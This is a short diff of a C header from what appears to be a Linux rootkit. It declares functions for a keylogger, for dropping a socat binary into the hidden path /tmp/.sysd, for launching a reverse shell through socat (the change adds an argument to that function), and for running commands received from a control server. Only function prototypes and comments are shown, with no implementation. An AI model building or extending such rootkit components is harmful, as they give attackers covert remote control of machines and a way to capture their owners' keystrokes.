@@ -114,7 +114,7 @@ int epikeylog_exit(void);									// Cleanup function for the keylogger
 // socat.c
 int drop_socat_binaire(void);								// Drop the socat binary in /tmp/.sysd
 int remove_socat_binaire(void);								// Remove the socat binary from /tmp/.sysd
-int launch_reverse_shell(void);								// Launch the reverse shell with socat
+int launch_reverse_shell(char *args);								// Launch the reverse shell with socat
 
 // rootkit_command.c
 int rootkit_command(char *command, unsigned command_size);	// Handle commands received from the server
